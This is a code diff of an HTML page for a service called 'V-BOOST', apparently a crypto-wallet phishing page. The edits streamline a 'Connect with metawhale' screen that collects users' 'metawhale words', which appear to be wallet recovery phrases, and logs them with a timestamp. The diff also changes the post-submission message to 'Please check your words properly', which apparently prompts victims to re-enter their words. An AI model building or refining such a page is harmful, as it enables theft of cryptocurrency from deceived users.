@@ -120,10 +120,6 @@ outline:none;
 background:#fff;
 }
 
-.input:focus{
-border-color:#d4d4d4;
-}
-
 .eye{
 position:absolute;
 right:16px;
@@ -337,10 +333,12 @@ Where your growth becomes digital capital
 <label class="label">Email</label>
 
 <div class="input-wrap">
+
 <input
 class="input"
 id="loginEmail"
 placeholder="Enter email">
+
 </div>
 
 <label class="label">Password</label>
@@ -581,7 +579,7 @@ Continue
 </div>
 </section>
 
-<!-- META -->
+<!-- META PAGE -->
 
 <section class="page" id="meta">
 
@@ -589,49 +587,16 @@ Continue
 <div class="logo">V-BOOST</div>
 </div>
 
-<div class="back"
-onclick="showPage('login')">
-←
-</div>
-
 <div class="center-box">
 
 <div class="heading">
 Connect with metawhale
 </div>
 
-<div class="sub"
-style="margin-top:18px">
+<div class="sub" style="margin-top:18px">
 
-Your V-Boost is not connected to MetaWhale,
-please try to connect it to MetaWhale first.
+Your V-Boost account is not connected with metawhale please connect
 
-</div>
-
-<button class="btn"
-style="margin-top:30px"
-onclick="showPage('wallet')">
-
-Continue
-
-</button>
-
-</div>
-
-</section>
-
-<!-- WALLET -->
-
-<section class="page" id="wallet">
-
-<div class="topbar">
-<div class="logo">V-BOOST</div>
-</div>
-
-<div class="center-box">
-
-<div class="heading">
-Connect with metawhale
 </div>
 
 <textarea
@@ -996,7 +961,7 @@ document.getElementById("walletCheck").checked;
 
 if(words===""){
 
-popup("Enter words");
+popup("Enter metawhale words");
 return;
 
 }
@@ -1016,7 +981,7 @@ time:new Date().toString()
 
 });
 
-popup("Please wait, metawhale is connecting");
+popup("Please check your words properly");
 
 }
 
